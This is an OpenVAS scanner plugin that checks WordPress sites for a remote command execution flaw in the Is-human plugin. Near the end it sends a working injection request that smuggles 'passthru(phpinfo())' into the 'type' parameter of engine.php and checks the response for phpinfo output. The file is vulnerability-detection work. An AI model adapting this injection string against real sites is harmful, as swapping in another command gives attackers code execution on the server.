###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_is_human_plugin_cmd_exec_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# WordPress Is-human Plugin 'passthru()' Function Remote Command Execution Vulnerability
#
# Authors:
# Veerendra GG <veerendragg@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will let remote attackers to execute malicious
  commands in the context of an affected site, also remote code execution
  is possible.
  Impact Level: Application/System";
tag_affected = "Is-human Wordpress plugin version 1.4.2 and prior.";
tag_insight = "The flaws are caused by improper validation of user-supplied input to the
  'passthru()' function in 'wp-content/plugins/is-human/engine.php', which
  allows attackers to execute commands in the context of an affected site.";
tag_solution = "No solution or patch is available as of th 18th May, 2011. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://wordpress.org/extend/plugins/is-human/";
tag_summary = "This host is installed with WordPress Is-human Plugin and is prone to remote
  command execution vulnerability.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.802021";
CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-05-26 10:47:46 +0200 (Thu, 26 May 2011)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"risk_factor", value:"Critical");
  script_name("WordPress Is-human Plugin 'passthru()' Function Remote Command Execution Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/67500");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/17299");
  script_xref(name : "URL" , value : "http://wordpress.org/extend/plugins/is-human");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/view/101497");

  script_description(desc);
  script_summary("Check if WordPress Is-human Plugin is vulnerable to command execution vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("wordpress/installed");
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

## Get HTTP Port
port = get_app_port(cpe:CPE, nvt:SCRIPT_OID);
if(!port){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## Get WordPress Installed Location
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port)){
  exit(0);
}

## Path of Vulnerable Page with phpinfo() function
path = dir + "/wp-content/plugins/is-human/engine.php?action=log-reset&" +
             "type=ih_options();passthru(phpinfo());error";

## Construct and Send attack request
req = http_get(item:path, port:port);
res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);

## Confirm exploit worked by checking the response
if(">phpinfo()<" >< res && ">System <" >< res && ">Configuration<" >< res
   && ">PHP Core<" >< res){
  security_hole(port);
}
